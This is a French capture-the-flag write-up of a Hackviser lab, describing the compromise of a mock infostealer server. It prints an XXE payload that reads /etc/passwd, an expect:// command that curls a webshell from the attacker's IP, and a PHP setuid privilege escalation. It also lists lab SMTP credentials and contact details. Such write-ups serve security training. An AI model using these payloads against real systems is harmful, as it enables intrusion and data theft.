# Writeup : Data Dome - Hackviser

Ce document détaille les étapes suivies pour compromettre le serveur du gang "Luna Stealer" et collecter les informations demandées.

## 1. Énumération Initiale

### Scan Nmap

Le scan initial a révélé deux ports ouverts :

- **22/tcp (SSH)**
- **80/tcp (HTTP)** : Apache 2.4.7 sur Ubuntu.

### Énumération Web

La racine du serveur retourne "Invalid endpoint". En utilisant un outil de fuzzing (gobuster/feroxbuster), on découvre :

- `/api` : Retourne "Hello World!".
- `/api/data` : Retourne "Method Not Allowed" (405).

## 2. Découverte de la vulnérabilité XXE

En changeant la méthode HTTP en **POST** sur `/api/data`, le serveur demande un `Content-Type: application/xml`.
En envoyant une requête XML vide, le serveur retourne un message d'erreur avec un modèle XML :

```xml
<UserData>
  <UserInformation>
    <UserName></UserName>
    <Country></Country>
    ...
    <IPAddress></IPAddress>
    ...
  </UserInformation>
</UserData>
```

Le serveur renvoie en écho le contenu du champ `<IPAddress>`. C'est un point d'entrée classique pour une injection **XXE (XML External Entity)**.

### Confirmation de l'XXE

On injecte l'entité suivante pour lire `/etc/passwd` :

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
...
<IPAddress>&xxe;</IPAddress>
```

Le serveur répond avec le contenu du fichier, confirmant la vulnérabilité.

## 3. Extraction d'Informations et Reverse Shell

### Lecture du code source

En utilisant le filtre PHP `php://filter/read=convert.base64-encode/resource=index.php`, on récupère le code source de l'API. On y découvre l'ASCII Art de **"LUNA STEALER"** et le lien du canal Telegram privé : `https://t.me/+4HRnpjAwSas4NDY0`.

### Upload d'un Webshell

En abusant de `expect://` (si activé) ou du traitement XML, on peut obtenir une exécution de commande. Le writeup de référence suggère d'utiliser `expect://` avec `$IFS` pour contourner les espaces :
`expect://curl$IFS-O$IFS'http://<NOTRE_IP>/webshell.php'`

Une fois le webshell en place, on dispose d'une exécution de commande en tant que `www-data`.

## 4. Escalade de Privilèges

### Analyse du conteneur

L'utilisateur `www-data` a des privilèges très limités. Cependant, en vérifiant les capacités des binaires (`getcap -r /`), on remarque :
`/usr/bin/php5 = cap_setuid+ep`

### Exploitation

On peut forcer l'UID à 0 (root) dans un script PHP :
`php5 -r 'posix_setuid(0); system("id");'`
Ceci nous donne les privilèges **root** à l'intérieur du conteneur.

## 5. Collecte des Preuves Finales

Depuis le conteneur, la racine de l'hôte est montée dans `/host`.

- **Nom du gang** : Luna (ou Luna Stealer).
- **Lien Telegram** : `https://t.me/+4HRnpjAwSas4NDY0`.
- **Identifiants SMTP** : Trouvés dans `/host/root/email/.env`.
  - User: `securityteamhelp984@gmail.com`
  - Pass: `GUV2vd6an2p3x7`
- **Première victime** : Trouvée dans `/host/root/email/victims.txt`.
  - `mark.tanner@quantumsolutions.hv`
- **Développeur** : Coordonnées trouvées dans `/host/root/stealer_app/README.md`.
  - Nom: Bob Eliason
  - Téléphone: `+1-(555)-462-1524`
